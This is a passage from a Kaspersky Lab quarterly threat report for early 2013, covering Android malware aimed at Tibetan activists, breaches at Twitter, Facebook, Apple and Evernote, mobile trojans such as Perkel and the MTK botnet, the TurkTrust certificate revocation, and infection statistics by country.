notifies its command server of a successful infection, and then begins to collect data stored on the device: contacts, call logs, text messages, GPS data and device information. Then the malware encrypts the stolen data using Base64 and uploads it to the command server. Kaspersky Lab\xe2\x80\x99s investigation of the command server shows that the attackers speak Chinese.  Just a few days after the results of our study were published, research organization The Citizen Lab published the results of its study of a similar incident. The target of the attack were people who were in one way or another associated with Tibet or Tibetan activists, and the malicious program that was used has a similar function (stealing personal information), but is an infected version of the Kakao Talk messenger.  Hacking corporate networks  Unfortunately, the first quarter of the year turned out to be chock full of incidents involving hacked corporate infrastructures and password leakages. Victims included Apple, Facebook, Twitter, and Evernote, among others.  In early February, Twitter made an official announcement that malicious users had managed to steal user data (including hash passwords) from 250,000 members of the social network. Two weeks later, Facebook issued a statement that the computers of several of the company\xe2\x80\x99s staff members had been infected by exploits during visits to a mobile developer site. Facebook described this as a sophisticated, targeted attack, noting that the goal was to penetrate Facebook\xe2\x80\x99s corporate network. Luckily, company representatives stated that Facebook was able to avoid any leakage of user information.  Just a few days later, Apple announced that several company employees had fallen victim to the very same attack while visiting a website for mobile developers. Apple\xe2\x80\x99s data showed that no data leakages had taken place. In early March, Evernote reported that their internal network had been hacked and that malicious users had attempted to gain access to their data.  In 2011, we witnessed mass hacking of various companies and mass user data leakages. It might seem like these attacks all came to nothing \xe2\x80\x94 but not so! Malicious users remain as interested as ever in hacking large companies and getting their hands on confidential data, including user information.  Mobile threats  Kaspersky Lab\xe2\x80\x99s report on the evolution of threats targeting smartphones, tablets, and other mobile devices in 2012 was published in February 2013. Our data shows that in 2012 Android became the number-one target among virus writers, and that the number of threats over the course of the year grew steadily. Has this upswing in the number of mobile threats continued in 2013 so far? Indeed it has.  A few numbers  January is traditionally a quiet month for mobile virus writers \xe2\x80\x94 \xe2\x80\x9conly\xe2\x80\x9d 1,262 new modifications appeared in the first month of the year. But over the past few months, Kaspersky Lab has detected over 20,000 new mobile malware modifications. In February, we detected 12,044 mobile malware modifications, and another 9,443 in March. To compare \xe2\x80\x94 a total of 40,059 modifications of malicious programs targeting mobile devices were detected over the whole of 2012.  SMS Trojans, which send unauthorized text messages to short, premium-rate numbers, are still the most prevalent category of mobile threats and currently represent 63.6% of all attacks.  A total of 99.9% of new mobile threat detections target the Android platform.  According to KSN data, the Top 20 most commonly used malicious or potentially unwanted programs for Android are:      Rank  Name  % of all attacks    1  Trojan-SMS.AndroidOS.FakeInst.a  29,45%    2  Trojan.AndroidOS.Plangton.a  18,78%    3  Trojan-SMS.AndroidOS.Opfake.a  12,23%    4  Trojan-SMS.AndroidOS.Opfake.bo  11,49%    5  Trojan-SMS.AndroidOS.Agent.a  3,43%    6  Trojan-SMS.AndroidOS.Agent.u  2,54%    7  RiskTool.AndroidOS.AveaSMS.a  1,79%    8  Monitor.AndroidOS.Walien.a  1,60%    9  Trojan-SMS.AndroidOS.FakeInst.ei  1,24%    10  Trojan-SMS.AndroidOS.Agent.aq  1,10%    11  Trojan-SMS.AndroidOS.Agent.ay  1,08%    12  Trojan.AndroidOS.Fakerun.a  0,78%    13  Monitor.AndroidOS.Trackplus.a  0,75%    14  Adware.AndroidOS.Copycat.a  0,69%    15  Trojan-Downloader.AndroidOS.Fav.a  0,66%    16  Trojan-SMS.AndroidOS.FakeInst.ee  0,55%    17  HackTool.AndroidOS.Penetho.a  0,54%    18  RiskTool.AndroidOS.SMSreg.b  0,52%    19  Trojan-SMS.AndroidOS.Agent.aa  0,48%    20  HackTool.AndroidOS.FaceNiff.a  0,43%      First place this past quarter goes to Trojan-SMS.AndroidOS.FakeInst.a (29.45%). This threat targets primarily Russian speaking Internet users attempting to download software for Android devices from dubious sites. Often, cybercriminals use these websites to spread malware under the guise of useful software.  (18.78%), an adware Trojan ranked second. This threat is seen primarily in European countries, where it is used by the developers of free software to monetize products by displaying ads.  Third and fourth place both went to SMS Trojans from the Opfake family: Trojan-SMS.AndroidOS.Opfake.a (12.23%) and Trojan-SMS.AndroidOS.Opfake.bo (11.49%). The first modifications of the Opfake family of threats were disguised as the latest version of Opera, a popular mobile browser. Today, the malicious programs in this family are disguised as new versions of other popular apps (Skype, Angry Birds, etc.).  Incidents  We would like to touch on two of the most interesting virus incidents of the first quarter this year:   a new threat going by the name of Perkele or Perkel, which hunts for mTANs,  and the MTK botnet.   Another important event that took place this past quarter was the targeted attacks against Android users that we addressed above.  Perkel  During the first two weeks of March, the well-known journalist Brian Krebs detected information on underground Russian-language forums about a new banking Trojan targeting mobile devices and allegedly affecting users in 69 countries. As rumor had it, the new threat had already infected no small number of devices. Krebs suggested that this Trojan was created by Russian speaking virus writers, since the combination of tools used to create it are made available on Russian-language forums.  This news naturally drew the attention of antivirus professionals, but no examples of the software were available for a while.  Several days later, the first modifications of Perkel were detected. After Kaspersky Lab performed an analysis, it became clear that there were some new additions to the family of malicious programs designed to steal text messages containing mTANs. The functions seen in the Perkel family are typical of this group, with two exceptions:   Perkel tends to use text messages rather than HTTP to communicate with the command server and upload stolen data (in addition to text messages with mTANs, the threat also collects information about the infected device).  The threat is capable of performing self-updates by downloading a new copy of itself from a remote server.   The MTK Botnet  In mid-January, word came out about the existence of a botnet that had infected up to one million Android devices owned primarily by Chinese users. As it turned out, the spread of a malicious program in China was at the root of the botnet (Kaspersky Lab has dubbed this malicious program Trojan.AndroidOS.MTK). It spread via unofficial Chinese app stores with popular, cracked games. In addition to stealing information about the infected smartphone, user contact data and messages, threats in this family also hype up a variety of apps. To do so, the Trojans stealthily download and install apps on the victim\xe2\x80\x99s mobile device, and then give that app the highest possible rating in the app store. Then, they report their actions to a remote server. The number of apps for Android is constantly on the rise, and it is often a challenge to gain popularity with users \xe2\x80\x94 which is why these illegitimate tactics are becoming all the more common.  TurkTrust\xe2\x80\x99s certificates revoked  In the first quarter of 2013, we saw yet another incident involving root certificates . Microsoft, Mozilla, and Google all revoked two root certificates issued by the certificate authority TurkTrust, thus removing them from their respective browser databases.  As it turned out, TurkTrust had released redundant root certificates to two organizations in place of typical SSL certificates. They could be used to make SSL certificates for any resource on the Internet, and the browsers used to access these resources would accept these certificates as \xe2\x80\x98trusted\xe2\x80\x99.  In December, Google found that one of the certificates issued by TurkTrust SSL for *.google.com had been involved in a \xe2\x80\x9cman-in-the-middle\xe2\x80\x9d type attack. Naturally, the fact that Google had been attacked meant that the certificates issued in the same way could be involved in attacks against other companies.  This latest in a line of major incidents related to root certificates and trust issues has shown that the malicious use of legitimate certificates remains a critical problem. However, the malicious usage of these types of certificates has only ever been identified after the fact, as currently there are no effective means of preventing these types of incidents at this time.  Statistics  em>All statistical data used in the report has been obtained from the cloud-based Kaspersky Security Network (KSN). The statistics were acquired from KSN users who consented to share their local data. Millions of users of Kaspersky Lab products in 213 countries take part in the global information exchange on malicious activity. Online threats The statistics in this section were derived from web antivirus components which protect users when malicious code attempts to download from infected websites. Infected websites might be created by malicious users, or they could also be made up of user-contributed content (such as forums) and legitimate resources that have been hacked. Detectable online threats In the first quarter this year, Kaspersky Lab solutions neutralized 821\xc2\xa0379\xc2\xa0647 attacks launched from online resources around the world.

First place on this past quarter\xe2\x80\x99s Top 20 detectable online threats was once again taken by blacklisted malicious links. Their share rose 0.5 percentage points from Q4 2012 and overall these links represented 91.4% of all web-based antivirus detections. Incidentally, the use of KSN tools to deliver instant updates to user computers via the cloud helped Kaspersky Lab products block 6.6% of malicious links. These links led to recently hacked websites, or websites that were specially created by malicious users that users had started to visit. Once again, Trojan.Script.Generic (2nd place) and Trojan.Script.Iframer (4th) made the Top 5. These threats are blocked during attempted drive-by attacks, which are one of the most common methods used to infect user computers these days. The Top 20 has featured Hoax.HTML. FraudLoad.i for several months now, and in Q1 2013 this threat was in 15th place. This malicious program is encountered primarily by users who download movies, TV shows, and software from questionable sources. Hoax.HTML.FraduLoad is detected on websites that users can visit to allegedly download certain content, but in order to do so, users must first send a paid text message or enter their cell phone number to fill out a paid subscription form. If the user meets all of the requirements, then he will receive the contents he wanted either in the form of a text file with instructions for using search engines, or worse \xe2\x80\x94 a malicious program. Exploit.Win32.CVE-2011-3402.c was in 16 th place this time around. This threat exploits a vulnerability in the win32k.sys registry (the TrueType Font Parsing Vulnerability). This was the same vulnerability used to spread the Duqu worm. Countries where online resources are seeded with malware This statistic highlights the countries where websites are physically located and which are seeded with malicious programs. In order to determine the geographical source of web-based attacks, a method was used by which domain names were matched up against actual domain IP addresses, and then the geographical location of a specific IP address (GEOIP) was established. Some 81% of online resources used to spread malicious programs are located in 10 countries. Over the past six months, that indicator has fallen by 5 percentage points \xe2\x80\x93 3 percentage points in the first quarter of 2013, and by 2 percentage points in Q4 2012.  The distribution of online resources seeded with malicious programs, Q1 2013 This time around, Russia (19%, -6 percentage points) and the US (25%, +3 percentage points) once again switched places in the ratings in terms of malicious hosting services \xe2\x80\x94 the US won back first place after losing it last quarter. The percentages represented by other countries are more or less unchanged since Q4 2012. Countries where users faced the greatest risk of online infection In order to assess the risk level for online infection that user computers face in different countries, we calculated just how often users with Kaspersky Lab products encountered web-based antivirus detections during the first three months of the year.  Top 20 countries* for online infection risks** in Q1 2013 *For the purposes of these calculations, we excluded countries where the number of Kaspersky Lab product users is relatively small (less than 10,000). **The percentage of unique users in the country with computers running Kaspersky Lab products that blocked web-borne threats. The Top 10 countries where users most frequently encounter malicious programs barely changed since the last quarter of 2012 and still includes countries from the FSU. Russia (57%) is in third place on the list. However, there were some changes in the Top 20: during the first three months of this year, Tunisia (43.1%) and Algeria (39%) both joined the Top 20. The only Western European country to make in into the Top 20 was Italy (39.9%, 16th place). All of the countries can be divided into four basic groups.  Maximum risk : This group includes countries where more than 60% of users encountered malware at least once while online during the reporting period. In the first three months of 2013, Tajikistan was the lone member of this group with 60.4%.  High risk : This group includes countries where 41 \xe2\x80\x93 60% of users encountered online malware at least once. Over this reporting period, 13 countries from the Top 20 (the same number as in Q4 2012) were in this category. With the exception of Vietnam, Tunisia, and Sri Lanka, most of the members of this group are from the FSU, specifically Armenia (59.5%), Russia (57%), Kazakhstan (56.8%), Azerbaijan (56.7%), Belarus (49.9%), and Ukraine (49%).  Moderate risk : This group includes countries where 21-40% of Internet users encountered malware \xe2\x80\x94 a total of 102 countries in Q1 2013, including Italy (39.9%), Germany (36.6%), France (35.8%), Belgium (33.8%), Sudan (33.1%), Spain (32.5%), Qatar (31.9%), the US (31.6%), Ireland (31.5%), the UK (30.2%), the UAE (28.7%) and the Netherlands (26.9%).  Low risk : With just 12.5 \xe2\x80\x93 21% of users encountering malware over the reporting period, this group included 28 countries in Q1 2013 and featured primarily African countries, where the Internet is still underdeveloped. Japan (15.6%) and Slovakia (19.9%) were exceptions.   The risk of online infection around the world, Q1 2013 On average, 39.1% of computers connected to KSN were subjected to an attack at least once over the first three months of the year during web surfing. The average percentage of computers attacked in Q1 2013 rose 1.5 percentage points from Q4 2012. Local threats This section of the report contains an analysis of statistics based on data obtained from the on-access scanner and scanning statistics for different disks, including removable media (the on-demand scanner). Threats detected on user computers In Q1 2013, Kaspersky Lab\xe2\x80\x99s security solutions successfully blocked 490\xc2\xa0966\xc2\xa0403 attempted local infections on user computers participating in Kaspersky Security Network.

As before, three verdicts are firmly in the lead in this Top 20. Malicious programs classified as DangerousObject.Multi.Generic detected using cloud technologies ranked in first place in Q1 2013 with 18.51% (up 1.8 percentage points from Q4 2012). Cloud technologies work when there are still no signatures in antivirus databases, and no heuristics for detecting malicious programs, but Kaspersky Lab\xe2\x80\x99s cloud already has data about the threat. This is essentially how the newest malicious programs are detected. Second place was taken by Trojan.Win32.Generic with 16% based on verdicts issued by the heuristic analyzer in the proactive detection of numerous malicious programs. Trojan.Win32.AutoRun.gen (13.6%) was in third place, and includes malicious programs that use the autorun feature. The adware family AdWare.Win32.Bromngr made its debut in the Top 20 at 8th place in Q4 2012. This quarter, it claimed two rankings (14th and 18th). All of the modifications of this adware module are DLL directories that are basically add-ons to commonly used browsers (Internet Explorer, Mozilla Firefox, and Google Chrome). Just like the overwhelming majority of these types of programs, this module changes a user\xe2\x80\x99s search settings, the home page, and periodically displays a variety of advertisements in pop-up windows. Countries where users run the highest risk of local infection The figures below show the average rate of infection among user computers in different countries. KSN participants who provide Kaspersky Lab with information had at least one malicious file detected on every third (31.4%) computer, either on their hard drive or a removable disk connected to the computer. This is 0.8 percentage points lower than in the previous quarter.  Computer infection levels by country* \xe2\x80\x93 TOP 20 ratings** for Q1 2013 *The percentage of unique users in the country with computers running Kaspersky Lab products that blocked web-borne threats. **When calculating, we excluded countries where there are fewer than 10,000 Kaspersky Lab users. For the fourth quarter in a row, the Top 20 positions in this category are held by countries in Africa, the Middle East, and South East Asia. The percentage of computers with blocked malicious code is the highest in Bangladesh, which saw another decrease, this time by 11.8 percentage points, leaving it on a total of 67.8% (down from 90.9% in Q3 2012). Local infection rates can also be put into four groups based on risk level:  Maximum local infection rate (over 60%): at the close of Q1 2013, this group included just two countries: Bangladesh (67.8%) and Vietnam (60.2%).  High local infection rate (41-60%): 41 countries, including Iraq (50.9%), Syria (45.5%), Myanmar (44.5%), Angola (42.3%), and Armenia (41.4%).  Moderate local infection rate (21 \xe2\x80\x93 40%): 60 countries, including China (37.6%), Qatar (34.6%), Russia (34.3%), Ukraine (33.6%), Lebanon (32.4%), Croatia (26.1%), Spain (26%), Italy (23.8%), France (23.4%), and Cyprus (23.3%).
